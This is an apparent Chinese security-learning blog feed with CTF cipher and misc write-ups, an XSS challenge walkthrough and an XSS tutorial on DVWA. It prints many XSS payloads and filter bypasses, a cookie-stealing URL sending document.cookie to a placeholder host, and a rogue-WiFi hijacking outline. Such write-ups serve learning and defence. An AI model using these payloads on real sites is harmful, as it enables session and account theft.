关键字词<br>一直下一个查找flag。知道找到为止。<br><img src="/2019/07/14/XL/WD3.PNG" alt="Image"><br>OK找到了。<br>这道题怎么说不算是很难，主要是需要的脑洞，不能只挂在一个点上想到用其他的打开。</p><h2 id="安全杂项-紧急报文"><a href="#安全杂项-紧急报文" class="headerlink" title="安全杂项-紧急报文"></a>安全杂项-紧急报文</h2><p>这个杂项？好像是密码把。<br><img src="/2019/07/14/XL/BW1.PNG" alt="Image"><br>字符的密文，然后我又想起来ASCII密码.但是有感觉不太对。因为两位一起的，越来越迷糊，越分析越不对劲。只好百度了一下。ADFGX密码？？第一次听到。</p><p>PS：ADFGX密码：ADFGX密码(ADFGX Cipher)是结合了改良过的Polybius方格替代密码与单行换位密码的矩阵加密密码，使用了5个合理的密文字母：A，D，F，G，X，这些字母之所以这样选择是因为当转译成摩尔斯电码(ADFGX密码是德国军队在一战发明使用的密码)不易混淆，目的是尽可能减少转译过程的操作错误。<br><img src="/2019/07/14/XL/AD.PNG" alt="Image"></p><p>标准解密实现 (以ADFGX为例)<br>假设我们拿到了密文DFGDGGAGXFXXFDDGDA，移位密钥china，密码表phqgmeaynofdxkrcvszwbutil。</p><p>先计算密文长度为18，移位密钥长度为5，则可以推算出移位密钥中有三个字母下会排下4个字母，移位密钥前三位是chi，因此chi下会排4个字母。</p><p>将密钥china按照字母顺序排列，得到achin，然后开始排列18个字母，其中chi排4个，其他排3个，得到<br><img src="/2019/07/14/XL/AD1.PNG" alt="Image"></p><p>然后排列回来</p><p><img src="/2019/07/14/XL/AD2.PNG" alt="Image"><br>一行一行读取，两两分割，然后对照密码表取回正确消息</p><p>这个就是解密的实现了<br>解析一下密文，解析结果是：flagxidianctf</p><p>OK就是这个了flag_Xd{hSh_ctf:flagxidianctf}</p><h2 id="雌黄出其唇吻"><a href="#雌黄出其唇吻" class="headerlink" title="雌黄出其唇吻"></a>雌黄出其唇吻</h2><p> 打开看到<img src="/2019/07/14/XL/CH1.PNG" alt="Image"></p><p>这里显示了一些奇异的字符，看不出是什么编码,且每次点击这个链接出现的字符都不一样，看来要另寻他路去解这道题</p><p>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</p><p>在该链接后面加上robots.txt看看有什么效果<br><img src="/2019/07/14/XL/CH2.PNG" alt="Image"><br>好像没啥变化  检查下 看看<br>果然 最底下还是有东西<br><img src="/2019/07/14/XL/CH3.PNG" alt="Image"></p><p>这是一个Sitemap 可方便网站管理员通知搜索引擎他们网站上有哪些可供抓取的网页。最简单的 Sitemap 形式，就是XML 文件，在其中列出网站中的网址以及关于每个网址的其他元数据（上次更新的时间、更改的频率以及相对于网站上其他网址的重要程度为何等），以便搜索引擎可以更加智能地抓取网站。</p><p>知道了就访问一波<br>看到了<img src="/2019/07/14/XL/CH4.PNG" alt="Image"><br>看到flag应该是个加密base64走起 得到flag：<br>7d175cCTF{robots_could_leak_information}f7c9db<br>搞定了</p><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>今天的练习暂时到此，大部分都是一般的题目不是很难 但也需要思考去如何做，一步步的理清思路能够有助于自己的提高。加油！需要了解的东西还是很多。</p>]]></content>
      
      
      
        <tags>
            
            <tag> MISC（一） </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码（练习一）</title>
      <link href="/2019/07/13/MA/"/>
      <url>/2019/07/13/MA/</url>
      
        <content type="html"><![CDATA[<h2 id="围在栅栏里的爱"><a href="#围在栅栏里的爱" class="headerlink" title="围在栅栏里的爱"></a>围在栅栏里的爱</h2><p>进入看到<br><img src="http://i1.fuimg.com/693893/6b9c1d75b439889e.png" alt="Image"></p><p>根据题目我们得到由点”.”和“-”组成的密码，初步判断是摩斯密码，找个网站进行在线解密。</p><p><img src="http://i1.fuimg.com/693893/966b9d26a26bb0a3.png" alt="Image"></p><p> 得到解密结果KIQLWTFCQGNSOO</p><p>一串没有意义的的字母串，根据题目给的提示“最近一直在好奇一个问题，QWE到底等不等于ABC？”</p><p>QWE指的是键盘上字母的排列顺序，ABC指的是26个字母的排列顺序<br>既然这样那就是<br><img src="http://i1.fuimg.com/693893/5ecf5acfeb86d7cf.png" alt="Image"></p><p>QWERTYUIOPASDFGHJKLZXCVBNM</p><p>ABCDEFGHIJKLMNOPQRSTUVWSYZ</p><p>一一对应解密</p><p>这样得到新的密码串：rhasbenvaoylii</p><p>进行一次翻转</p><p>得到iilyoavnebsah<br>既然题目给了栅栏应该能够再用到一次栅栏加密 所以</p><p><img src="http://i1.fuimg.com/693893/2128ba04cfbc3f9b.png" alt="Image"></p><p>得到flag</p><p>CTF{iloveshiyanbar}</p><h2 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h2><p>小明某一天收到一封密信，信中写了几个不同的年份<br>辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。<br>信的背面还写有“+甲子”，请解出这段密文。<br>key值：CTF{XXX}</p><p>密码加上古典知识。<br><img src="http://i1.fuimg.com/693893/3b6002436329b581.png" alt="Image"><br>首先百度了一下辛卯，发现了辛卯为干支之一，顺序为第28个。咦密码题 出现了数字。依次百度了剩下的。<br>发现了</p><p>辛卯，顺序为第28个<br>癸巳，顺序为第30个<br>丙戌，顺序为第23个<br>辛未，顺序为第 8个<br>庚辰，顺序为第17个<br>癸酉，顺序为第10个<br>己卯，顺序为第16个<br>癸巳，顺序为第30个</p><p>这样甲子又是第60个。</p><p>辛卯，顺序为第28个 + 甲子(60) –&gt; 88 –&gt;  X</p><p>癸巳，顺序为第30个 + 甲子(60) –&gt; 90 –&gt;  Z</p><p>丙戌，顺序为第23个 + 甲子(60) –&gt; 93 –&gt;  S</p><p>辛未，顺序为第8个 + 甲子(60) –&gt; 68 –&gt;  D</p><p>庚辰，顺序为第17个 + 甲子(60) –&gt; 77 –&gt;  M</p><p>癸酉，顺序为第10个 + 甲子(60) –&gt; 70 –&gt;  F</p><p>己卯，顺序为第16个 + 甲子(60) –&gt; 76 –&gt;  L</p><p>癸巳，顺序为第30个 + 甲子(60) –&gt; 90 –&gt;  Z</p><p>加上一个甲子即60：88 90 93 68 77 70 76 90 </p><p>转换成ASCII字母：XZSDMFLZ </p><p>栅栏密码（两栏）：XMZFSLDZ</p><p>凯撒：SHUANGYU</p><p>OK提交成功 最后提交的时候要注意格式.</p><h2 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h2><p>小明某天在看js的时候，突然看到了这么一段代码，发现怎么也理不出代码逻辑，你能帮帮他吗？</p><p>格式：SimCTF<br>首先进入到网页中可以看到一串代码<br><img src="http://i1.fuimg.com/693893/f883da4a40a3c7d8.png" alt="Image"><br>之后查看源代码，复制源码，打开网页控制台，将eval改为console.log回车执行<br>PS：复制的源代码一定是要复制查看的源代码。不要问我为啥知道的。。。</p><p><img src="http://i1.fuimg.com/693893/be61f8ada87090b9.png" alt="Image"></p><p>发现unicode编码\u0053\u0069\u006d\u0043\u0054\u0046\u007b\u006a\u0073\u005f\u0065\u006e\u0063\u006f\u0064\u0065\u007d<br><img src="http://i1.fuimg.com/693893/7aeecf49a01643de.png" alt="Image"></p><p>之后进行的编码进行转码。<br><img src="http://i1.fuimg.com/693893/c6ed6fadd5943d6c.png" alt="Image"></p><p>成功的解开。</p><h2 id="这里没有key"><a href="#这里没有key" class="headerlink" title="这里没有key"></a>这里没有key</h2><p><img src="http://i1.fuimg.com/693893/936b9d7f6daa224f.png" alt="Image"><br>打开文件就给我一个弹窗说这里没有key。我差点就信了呢。查看源码走一波。</p><p><img src="http://i2.tiimg.com/693893/e6d298ab1ae5a0b7.png" alt="Image"><br>看最后一行被注释掉的内容</p><p><img src="http://i2.tiimg.com/693893/8f2619922337c4a8.png" alt="Image"><br>找一个网上的在线解题的网站：<a href="https://www.dheart.net/decode/index.php" target="_blank" rel="noopener">https://www.dheart.net/decode/index.php</a><br>解密<br><img src="http://i1.fuimg.com/693893/e5d5891d1f4312cc.png" alt="Image"><br>OK解出来了。</p><h2 id="古典密码的安全性不高，但仍然十分美妙，请破译下面的密文"><a href="#古典密码的安全性不高，但仍然十分美妙，请破译下面的密文" class="headerlink" title="古典密码的安全性不高，但仍然十分美妙，请破译下面的密文"></a>古典密码的安全性不高，但仍然十分美妙，请破译下面的密文</h2><p>打开之后又是一大串的代码<br><img src="http://i1.fuimg.com/693893/26cae1736f3948ec.png" alt="Image"></p><p>这一大串代码则置换密码可以通过高频词分析破解：这样的话我想到了去破解 但是手工破解是挺麻烦的，看看大佬们怎么整的 发现他们找了一个网站 <a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a> 于是乎借用了下<br><img src="http://i2.tiimg.com/693893/185759d33efc1f80.png" alt="Image"><br>这里第二个空格栏是说让我们提供些线索，也就是说我们觉得可能什么单词对应什么单词，填在此栏即可，dsln=flag 这个地方看他最后的代码中应该是flag的意思不妨尝试一下。<br><img src="http://i2.tiimg.com/693893/9d87d1a03a57c3ff.png" alt="Image">看看这些代码最后面的flag is  所以这些都是应该有些规律的去看看。就可以了逐一尝试我们觉得可行的flag，得到正确结果<br><img src="http://i2.tiimg.com/693893/d2609ec0e3d0d969.png" alt="Image"><br>OK成功</p>]]></content>
      
      
      
        <tags>
            
            <tag> 密码（练习一） </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS(练习一)</title>
      <link href="/2019/07/11/XSSL/"/>
      <url>/2019/07/11/XSSL/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经过上次对XSS的理解与对XSS理解的一个小练习，清楚了之后，开始着手进行XSS平台搞一波。<br>这是我练习的平台<a href="http://test.xss.tv/" target="_blank" rel="noopener">http://test.xss.tv/</a></p><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><img src="http://i2.tiimg.com/693893/6084a26c6c8ae42b.png" alt="Image"></p><p>这里的payload明确看到为4，查看地址栏与之对应的传参为test.<br>但是页面上没有出现明确的注入的地方，也没有输入的地方，这时候我们可以使用Hackbar进行注入脚本，也可以在URL栏进行注入。<br>我们输入&lt; script&gt;alert(‘yes’)&lt;/ script&gt;(由于编辑器问题我在&lt;后面加了空格，使用时记得注意清除掉。以下都是这样。)</p><p>在地址栏输入后回车 就OK了<br><img src="http://i2.tiimg.com/693893/3a0e354a32752a21.png" alt="Image"></p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p><img src="http://i2.tiimg.com/693893/b223a6835a91a5cc.png" alt="Image"><br>这是我们依旧使用第一关的代码进行一下测试。发现没有弹窗的出现，他们提示我没有找到相关的内容。之后我们进行源代码的查看。<br><img src="http://i2.tiimg.com/693893/b706990524d1b5bc.png" alt="Image"><br>我们根据源代码发现需要先将value属性闭合，然后使用javascript脚本调出alert函数过关</p><p>//输入代码回车</p><p>“&gt;&lt; script&gt;alert(‘yes’)&lt;/ script&gt;<br>闭合之后绕过进行实现脚本的注入。<br>之后点击搜索或者回车都可以 可以得到以下的结果。<br><img src="http://i2.tiimg.com/693893/805da03654171c3a.png" alt="Image">回车或者点击搜索后过关</p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p> 这个页面与之前关卡的相似 这里我直接使用’” &gt;进行测试，之后输入第二关用过的语句进行测试。<br> <img src="http://i2.tiimg.com/693893/00677c1c9a9b03df.png" alt="Image"><br> “&gt;&lt; script&gt;alert(‘12321321terad’)&lt;/ script&gt;进行测试，并没还有成功，这是输入值，进行源代码的查看。<br> <img src="http://i2.tiimg.com/693893/b1b296bd03783066.png" alt="Image"><br> 我发现，我输入的字符被转义成了其他的字符，没有办法实现有效的注入，没有形成语句。我们输入的”&lt;&gt; 都被做了转义处理。<br> <img src="http://i2.tiimg.com/693893/96d3cfa4382bddaa.png" alt="Image"><br> 这里进行了一下小小的总结</p><p> 总结HTML 的所有特殊字符的实体编号和实体名称表<br> <img src="http://i2.tiimg.com/693893/7b82444cd5d1302a.png" alt="Image"><br> 这里确定以上字符无法在输入框中注入，所以不能采用第二关的方式调用javascript脚本</p><p>于是这里我使用了别的方法调用alert()函数实现闯关：<br>ooninput 能够获取到运行的脚本。<br>123’ οninput=’alert(123)<br>之后我们依旧使用’来闭合前面的语句。<br>输入后可以看到<br><img src="http://i2.tiimg.com/693893/6939d0abfddc16ec.png" alt="Image"></p><p>PS：   如果我们在没有看源代码的情况下如何去判断value属性使用的是单引号还是双引号？<br>在上面已经使用过一次。<br>判断value使用的是单引号还是双引号方法：</p><p>输入 ‘ “ &gt; 三个字符测试闭合，查看文本框内的内容<br><img src="http://i2.tiimg.com/693893/f23e491abb6e881a.png" alt="Image"><br>文本框无内容就是单引号，内容为 ‘ 即为双引号<br>这一关中使用的是单引号，所以value没有值，文本框内没有内容</p><p>如果我们输入如下的字符test’”&gt; 就会得到test 因为value闭合为’<br><img src="http://i2.tiimg.com/693893/e1c008a389355e89.png" alt="Image"></p><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>进入第四关直接进行一个之前的语句来个测试</p><p>输入&lt; script&gt;alert(‘12321321terad’)&lt;/ script&gt;测试：<br><img src="http://i2.tiimg.com/693893/d1446897e2d8591d.png" alt="Image"></p><p>结果是没有找到相关的结果。这时候我发现框中返回结果跟我们输入的不大相同，让我来看看它的源代码。<br><img src="http://i2.tiimg.com/693893/2e5138ea9e6d173d.png" alt="Image"><br>我们可以清楚的看到 我们符号中的&lt;&gt;被过滤掉了。</p><p>这也是过滤的问题 我继续使用了第三关的方法测试，输入语句：</p><p>“ oninput=”alert(‘’)<br><img src="http://i2.tiimg.com/693893/1608aaec83d3be79.png" alt="Image"><br>OK成功弹窗进入下一关。</p><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>输入语句测试</p><p>“&gt; &lt; script&gt;alert(‘ok’)&lt;/ script&gt;<br><img src="http://i2.tiimg.com/693893/bb4fbd86a56ed3f7.png" alt="Image"><br>观察源代码发现我输入的字符被替换了<br><img src="http://i2.tiimg.com/693893/f0351636661cd3e5.png" alt="Image"><br>我们使用大小写不同的绕过方式，发现并没有什么卵用。</p><p>接着我们使用HTML中的oninput事件发现也是被替换掉了<br><img src="http://i2.tiimg.com/693893/5f63c248140f1858.png" alt="Image"><br>过滤了&lt; script&gt;和on就是说之前我用的事件触发就不能再用了。</p><p>所以我现在尝试嵌入一个连接，在连接的时候调用alert</p><p>“&gt;&lt; a href=”javascript:alert(‘ok’)”&gt;sl&lt;/ a&gt;//<br>可以伪造了一个链接在链接中包含<br><img src="http://i2.tiimg.com/693893/f2af20cf459ee100.png" alt="Image"><br>这时候再点击sl<br><img src="http://i2.tiimg.com/693893/78f01fdcc7d8ab7a.png" alt="Image"><br>OK下一关</p><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p>进入我们先测试一下。<br><img src="http://i2.tiimg.com/693893/84f2fa53f28e6137.png" alt="Image"><br>这次使用的不再是’ 而是” 这里我们还是继续语句测试<br>“&gt; &lt; script&gt;alert(‘ok’)&lt;/ script&gt;<br><img src="http://i2.tiimg.com/693893/c10839f641353169.png" alt="Image"><br>这样 我看了看源码，<br><img src="http://i2.tiimg.com/693893/9a604fe50837b613.png" alt="Image"><br>发现script 变成了scr_ipt<br>script被过滤掉了，我又试试了HTML中的oninput事件<br><img src="http://i2.tiimg.com/693893/d2dd4efc04030728.png" alt="Image"><br>同样没有成功查看源码<br><img src="http://i2.tiimg.com/693893/5675bd94d3f0cc69.png" alt="Image"><br>oninput 变成了o_ninput<br>看来是跟前面一关的题目一样，这样我们就继续使用伪链接的方法进行绕过。<br>“&gt;&lt; a href=”javascript:alert(‘ok’)”&gt;sl&lt;/ a&gt;//<br><img src="http://i2.tiimg.com/693893/290ddd2cea4b9e2d.png" alt="Image"><br>！看来是个狼灭，这也过不去，看看源码<br><img src="http://i2.tiimg.com/693893/e5c4a7dea7bd44da.png" alt="Image"><br>href被替换成了hr_ef<br>我又将部分字母换成大写尝试：</p><p>“&gt; &lt; a hRef=javascript:alert(‘ok’)&gt;sl&lt; /a&gt;//<br>这时候出现了链接 OK点击链接下一关<br><img src="http://i2.tiimg.com/693893/ecd5896e47ea1169.png" alt="Image"></p><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p>进入第七关，之前用的测试语句走一波先。</p><p>“&gt;&lt; script&gt;alert(‘12321321terad’)&lt;/ script&gt;<br><img src="http://i2.tiimg.com/693893/b6341fc6d203a16c.png" alt="Image"><br>仔细看输入的内容与返回的内容前面的script没了。应该源码中有什么语句把它给过滤掉了，这时候我们看看源码。<br><img src="http://i2.tiimg.com/693893/352deca4ec9a5f7b.png" alt="Image"><br>来使用一波HTML事件试试<br>“ οninput=”alert(‘ok’)”<br><img src="http://i2.tiimg.com/693893/7ecd8d0b9ca655a2.png" alt="Image">这应该是又被过过滤掉了<br>这样的话 记得之前用过双写绕过 </p><p> 来试试”&gt; &lt; scrscriptipt&gt;alert(“123123”)&lt;/ scrscriptipt&gt;<br><img src="http://i2.tiimg.com/693893/2ad252188bed183b.png" alt="Image"><br>既然这样双写可以绕过的话，相同的应该” oonninput=”alert(‘ok’)”<br>OK下一关。</p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>进入第八关，依旧进行尝试<br><img src="http://i2.tiimg.com/693893/2ad252188bed183b.png" alt="Image"><br>发现此路不通 同样实验HTML事件 也是不通，那就看一波源码，发现这个<br><img src="http://i2.tiimg.com/693893/de04fc6db959f710.png" alt="Image"><br>发现”,&lt;,&gt;被转义了而且ON中间也有过滤。这一下事情好像没那么简单。<br>然后再次看看上的源码，发现了一个链接 难道又是伪链接？<br>来实验一波发现依旧不行<br><img src="http://i2.tiimg.com/693893/684154c53074e783.png" alt="Image">同时script还是被过滤了。这样的话，需要用到script但是不能让他被过滤掉，好像只能用到其他的编码形式了，于是去找了找度娘 发现了script的编码形式：</p><p>HTML实体编码（HEX）<br>javascri&amp;# x70;t:alert()</p><p>HTML实体编码（DEC）<br>javascri&amp;# 112;t:alert()</p><p>PS：还是由于编辑器的问题 我在上面的编码中的”#”后面添加了空格，（看来我得换个编辑器了）。<br>但是要注意  后台这里过滤的是script  并没有java </p><p>于是输入进去<br><img src="http://i2.tiimg.com/693893/ad01fa83b1ed7e64.png" alt="Image"><br>ok开启下一关</p><h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p>进军 第九关<br>看到跟前面一关差不多的形式也是友情链接 那就直接来 把上一关的语句直接来用结果当然不会让你过。<br><img src="http://i2.tiimg.com/693893/f4ac77a7a364ef0a.png" alt="Image"><br>那我们来看看他的源码<br><img src="http://i2.tiimg.com/693893/47b6e2b2bb577d41.png" alt="Image"><br>在href一栏中告诉我 我的链接不合法。连接不合法怎么办。肯定是你的URL不对 少了HTTP这个，他没有检测到，那我就让他检测到 同时不让他起作用不久OK了吗。</p><p>所以在这我给它注释掉javascri&amp;# x70;t:alert(/sl/)//http://<br>这样不就OK了<br><img src="http://i2.tiimg.com/693893/64cf77c4daab2d04.png" alt="Image">这时候看下它的源码<br><img src="http://i2.tiimg.com/693893/ff35af4f09b8ba07.png" alt="Image"><br>相比较下 第九关就是在第八关上的多添加了一个认证，需要检测到http </p><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p> 首先看了下没有发现输入框<br> <img src="http://i2.tiimg.com/693893/c60e66547dccb35c.png" alt="Image"><br> 这样还是看看源码的比较好<br> <img src="http://i2.tiimg.com/693893/31510a381db30f1d.png" alt="Image"><br>keyword过滤了用不了，没有输出点。有点懵。发现它源码中的input中  tupe是hidden 是个隐藏。不过还是不知道该从何处下手最好参考了下先知的wp。</p><p>因为也没过滤什么，最后的参考payload为:</p><p>keyword=test&amp;t_sort=” type=”text” onclick=”alert()<br><img src="http://i2.tiimg.com/693893/d5ca248989b7c14d.png" alt="Image"></p><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>暂时先就练习到这里，改天继续更新做题情况。总之要学习的地方还很多，还有很多的未知领域，需要继续加油了！</p>]]></content>
      
      
      
        <tags>
            
            <tag> XSS（练习一） </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于XSS的个人理解与基本练习</title>
      <link href="/2019/07/09/XSS/"/>
      <url>/2019/07/09/XSS/</url>
      
        <content type="html"><![CDATA[<h2 id="前端安全–XSS攻击"><a href="#前端安全–XSS攻击" class="headerlink" title="前端安全–XSS攻击"></a>前端安全–XSS攻击</h2><p>XSS漏洞是最广泛、作用最关键的web安全漏洞之一。在绝大多数网络攻击中都是把XSS作为漏洞链中的第一环，通过XSS，黑客可以得到的最直接利益就是拿到用户浏览器的cookie，从而变相盗取用户的账号密码。</p><p>这些常用的基本的攻击方式对我们学web安全的来说提升自己的同时，也能体验到XSS的乐趣。</p><p>在我们学习的时候需要理解XSS的原理以及特点</p><h3 id="关于XSS简述"><a href="#关于XSS简述" class="headerlink" title="关于XSS简述"></a>关于XSS简述</h3><p>跨站脚本攻击（XSS），是目前最普遍的Web应用安全漏洞。这些漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。<br>攻击者可以使用户在浏览器中执行其预定义的恶意脚本，其导致的危害可想而知，如劫持用户会话，插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器对用户进行一定程度的破坏。</p><h3 id="XSS的原理"><a href="#XSS的原理" class="headerlink" title="XSS的原理"></a>XSS的原理</h3><p>学习什么都要记得先弄清楚原理。网站的搭建大部分都是上HTML+CSS然后嵌入javascript。标记语言HTML通过将一些字符特殊地对待来区别文本和标记，当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段javascript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。</p><h3 id="XSS的类型"><a href="#XSS的类型" class="headerlink" title="XSS的类型"></a>XSS的类型</h3><p>1.反射型 Reflected XSS<br>反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。对于访问者而言是一次性的，具体表现在我们把我们的恶意脚本通过 URL 的方式传递给了服务器，而服务器则只是不加处理的把脚本“反射”回访问者的浏览器而使访问者的浏览器执行相应的脚本。反射型 XSS 的触发有后端的参与，要避免反射性 XSS，必须需要后端的协调，后端解析前端的数据时首先做相关的字串检测和转义处理。</p><p>2.基于DOM或本地的XSS攻击 DOM-Based型<br>基于DOM的XSS跨站脚本攻击是通过修改页面。DOM节点数据信息而形成的XSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的Javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。</p><p>3.存储型 Stored XSS<br>这种类型的XSS，危害比前一种大得多。比如一个攻击者在论坛的楼层中包含了一段JavaScript代码，并且服务器没有正确进行过滤输出，那就会造成浏览这个页面的用户执行这段JavaScript代码。 </p><h2 id="XSS攻击举例"><a href="#XSS攻击举例" class="headerlink" title="XSS攻击举例"></a>XSS攻击举例</h2><p>1.反射型攻击<br>（1）正比如我们在京东或者淘宝搜索”笔记本”,搜不到书的时候显示提交的名称。（2）在搜索框搜索内容，填入“script alert(‘matebook’)/script”, 点击搜索。(由于个人编译器的问题省略了&lt;&gt;记得加上哦)（3）当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。我们都知道alert是一个弹出框口在web页面中。（4） 进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：<br><a href="http://www.jingdong.com/search?name=" target="_blank" rel="noopener">http://www.jingdong.com/search?name=</a> script document.location=’<a href="http://xxx/get?cookie=&#39;+document.cookie" target="_blank" rel="noopener">http://xxx/get?cookie=&#39;+document.cookie</a> script(由于个人编译器的问题省略了&lt;&gt;记得加上哦)<br>这个地址是伪造的 ，当然是无效的地址。这些地址的来源都是来自QQ邮箱中收到的垃圾邮件以及诈骗的链接中的。</p><p>2.存储型攻击<br>基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。<br>正如</p><ol><li>发一篇文章，里面包含了恶意脚本<br>今天你做CTF了吗？你打CTF像胡一天 script alert(‘handsome boy’) /script (由于个人编译器的问题省略了&lt;&gt;记得加上哦)</li><li>后端没有对文章进行过滤，直接保存文章内容到数据库。</li><li>当其他看这篇文章的时候，包含的恶意脚本就会执行。<br>因为部分文章是保存整个HTML内容的，前端显示时候也不做过滤，就极又极大的可能出现这种情况。</li></ol><p>对于这种我们可以采用一些安全的防护措施<br>在开发的时候我们可以：</p><ol><li>首要是服务端要进行过滤，因为前端的校验可以被绕过。</li><li>当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转换成HTML编码。</li></ol><p>3.DOM-based or local XSS<br>基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。<br>例子一：</p><ol><li>提供一个免费的wifi。</li><li>开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP。</li><li>之后连上wifi的用户打开任何网站，请求都将被我们截取到。我们根据http头中的host字段来转发到真正服务器上。</li><li>收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户。</li><li>当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。</li></ol><p>这个例子来自大佬的博客，<a href="http://www.cnblogs.com/index-html/p/wifi_hijack_3.html#!comments" target="_blank" rel="noopener">http://www.cnblogs.com/index-html/p/wifi_hijack_3.html#!comments</a></p><p>这个是大佬进行的wifi流量劫持，中间人可以看到用户的每一个请求，可以在页面嵌入恶意代码，使用恶意代码获取用户的信息，可以返回钓鱼页面。 PS：对这个有兴趣的可以进行一下尝试，个人本人对这个挺感兴趣的。<br>例子二：</p><ol><li>还是提供一个免费wifi</li><li>在我们电脑上进行抓包</li><li>分析数据，可以获取用户的微信朋友圈、邮箱、社交网站帐号数据（HTTP）。<br>这个是HTTP的窃取，本身跟网站的关系不是特别的大，只是数据被中间人获取了而已，因为HTTP是明文传输的，所以这个容易被别有心思的人所利用。注意防范。<br>开发安全措施：<br>上面提到了使用HTTP协议，HTTP协议相对于HTTPS协议，两者的差异性是在安全性上面的，所以就协议本身来说HTTPS协议的安全性高于HTTP，所以HTTPS会在请求数据之前进行一次握手，使得客户端与服务端都有一个私钥，服务端用这个私钥加密，客户端用这个私钥解密，这样即使数据被人截取了，也是加密后的数据。</li></ol><h2 id="小小总结"><a href="#小小总结" class="headerlink" title="小小总结"></a>小小总结</h2><p>XSS攻击的特点就是：用一些办法在目标网站上执行非目标网站上原有的脚本</p><p>本地的XSS攻击的示例2其实不算XSS攻击，只是简单流量劫持。前两种XSS攻击是我们在以后的开发时候要注意的，而流量劫持的则可以使用HTTPS提高安全性。</p><h2 id="小练习"><a href="#小练习" class="headerlink" title="小练习"></a>小练习</h2><p>一、为了能够更好的了解这三种XSS攻击类型，在网上找到了一个在线的练习平台，平台名字叫安全龙，免费的实验室，在里面可以根据自己的需求进行练习。 </p><p>个人是在实验室中进入了DVWA靶场，当然你也可以从DVWA的官网上下载到电脑进行部署也可以。</p><p>首先我们可以先进行反射型XSS的应用</p><h3 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h3><p>进入到DVWA环境中，首先根据平台提示进入，之后选择安全等级。<br><img src="/2019/07/09/XSS/security.PNG" alt="Image">在这里是最低的，可以根据个人的需要进行调整</p><h4 id="初级"><a href="#初级" class="headerlink" title="初级"></a>初级</h4><p>我们进入到其中的反射型XSS（Reflected）中，在右下角有一个Viwe source 这个点击我们可以看到页面的源代码。之后进行尝试。<img src="/2019/07/09/XSS/Reflected1.PNG" alt="Image"></p><p>可以看到源码中没有任何的过滤，我们可以使用最常用的也是最基本的语句： script alert(/dxy/) /script （&lt;&gt;由于编辑器使用后默认为网页源代码这里给去掉了，各位进行试验的时候记得加上！）<br><img src="/2019/07/09/XSS/D1ROK.PNG" alt="Image"></p><h4 id="中级"><a href="#中级" class="headerlink" title="中级"></a>中级</h4><p>接下来我们选择一下等级。选择到中级Medium。<br>可以进行一下实验看中级下原来可以弹窗的初级语句有什么变化没有。输入后发现<img src="/2019/07/09/XSS/1.PNG" alt="Image"></p><p>可以看出没有任何的弹窗提示 ，只是出现了你刚才命令弹窗中的内容。<br>这时候我们同样的方式查看他的源代码。发现有一部分被过滤掉了。<br><img src="/2019/07/09/XSS/REZY.PNG" alt="Image"></p><p>在这里我们可以清晰的看到我们输入的字符中发现前面的&lt; script&gt;没有了，那就看看源代码中有什么过滤方式把&lt; script&gt;给过滤掉了.<br>str_replace(‘&lt; script&gt;’ ‘’)这里的str_replace（）函数以其他字符替换字符串中的一些字符，该函数区分大小写。使用 str_ireplace() 函数执行不区分大小写的搜索。</p><p>这里我们了解了该函数区分大小写。这样我们就可以使用大小写来进行绕过他的过滤从而达到我们想要的效果。<br>&lt; 